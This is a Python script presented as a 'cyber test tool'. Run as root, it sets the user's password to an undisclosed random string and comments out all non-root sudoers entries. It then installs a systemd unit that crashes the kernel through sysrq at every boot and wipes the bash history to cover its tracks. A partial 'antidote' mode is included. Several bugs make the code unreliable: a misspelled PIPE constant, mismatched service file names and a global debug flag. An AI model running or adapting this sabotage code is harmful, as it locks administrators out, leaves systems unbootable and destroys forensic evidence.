#!/usr/bin/env python3
###############################################################################
# Name        : loopiloop.py                                                  #
# Author      : Abel Gancsos                                                  #
# Version     : v. 1.0.0.0                                                    #
# Description : Cyber test tool.                                              #
###############################################################################
import os, sys, subprocess, random;

class LoopiLoop:
	def __init__(self, debug=True):
		self.debug = debug;
	def generate_phrase(self):
		rst = "";
		chars     = "0,1,2,3,4,5,6,7,8,9,a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z";
		chars2    = chars.split(",");
		max_chars = random.randint(10,30);
		for i in range(0, max_chars + 1):
			rand_i = random.randint(0, len(chars2) - 1);
			if rand_i <= 9: rst += chars2[rand_i];
			else:
				is_capital = random.randint(0, 1) == 1;
				if is_capital: rst += chars2[rand_i].upper();
				else: rst += chars2[rand_i];
		return rst;
	def invoke_exploit(self):
		phrase = self.generate_phrase();
		if not debug:
			handle = subprocess.Popen("passwd", stdin=subprocess.PIP, stdout=None, stderr=None);
			handle.communicate(((phrase + "\n")*2).encode("utf-8"));
		if os.path.exists("/etc/sudoers"):
			raw_sudoers = ""; 
			new_sudoers = "";
			with open("/etc/sudoers", "r") as fh: raw_sudoers = fh.read();
			for line in raw_sudoers.split("\n"):
				if line != "" and line[0] != "#" and line.split(" ")[0] not in ["root", "Defaults", "@includedir"]:
					new_sudoers += "\n######AMG {0}".format(line);
				else: new_sudoers += "\n{0}".format(line);
			if not self.debug:
				with open("/etc/sudoers", "w") as fh: fh.write(new_sudoers);
		if os.path.exists("/proc/sys/kernel/panic"):
			with open("/proc/sys/kernel/panic", "r") as fh:
				ttr = fh.read().strip();
				if ttr == "" or int(ttr) == 0:
					if not self.debug: subprocess.run(["bash", "-c", "echo '1' > /proc/sys/kernel/panic"]);
		if not self.debug:
			with open("/etc/systemd/system/network.service", "w") as fh:
				fh.write('''
[Unit]
Description=LoopiLoop
Wants=default.target
Before=network.target 

[Service]
Type=service
ExecStart=echo c > /proc/sysrq-trigger

[Install]
WantedBy=default.target
''');
			subprocess.run(["bash", "-c", "systemctl enable --now loopiloop"]);
		if not self.debug: subprocess.run(["bash", "-c", "cat /dev/null > ~/.bash_history"]);
	def invoke_antidote(self):
		raw_sudoers = "";
		if os.path.exists("/etc/sudoers"):
			with open("/etc/sudoers", "r") as fh: raw_sudoers = fh.read();
			raw_sudoers = raw_sudoers.replace("######AMG ", "");
			if not self.debug:
				with open("/etc/sudoers", "w") as fh: fh.write(raw_sudoers);
		if os.path.exists("/proc/sys/kernel/panic"):
			with open("/proc/sys/kernel/panic", "r") as fh:
				ttr = fh.read().strip();
				if ttr != "" and int(ttr) == 1:
					if not self.debug: subprocess.run(["bash", "-c", "echo '0' > /proc/sys/kernel/panic"]);
		if not self.debug:
			subprocess.run(["bash", "-c", "systemctl disable --now loopiloop"]);
			os.remove("/etc/systemd/system/loopiloop.service");
		if not self.debug: subprocess.run(["bash", "-c", "cat /dev/null > ~/.bash_history"]);

if __name__ == "__main__":
	params               = {};
	for i in range(0, len(sys.argv) - 1):
		params[sys.argv[i]] = sys.argv[i + 1];
	debug                = False if "--debug" in params.keys() and int(params["--debug"]) < 1 else True;
	user                 = subprocess.run(["bash", "-c", "whoami"], stdout=subprocess.PIPE).stdout.decode().strip();
	assert user == "root", "Script must be ran as root user...";
	operation            = params.get("--op", "exploit");
	session              = LoopiLoop(debug);
	print("Debug: {0}".format(debug));
	getattr(session, "invoke_{0}".format(operation))();

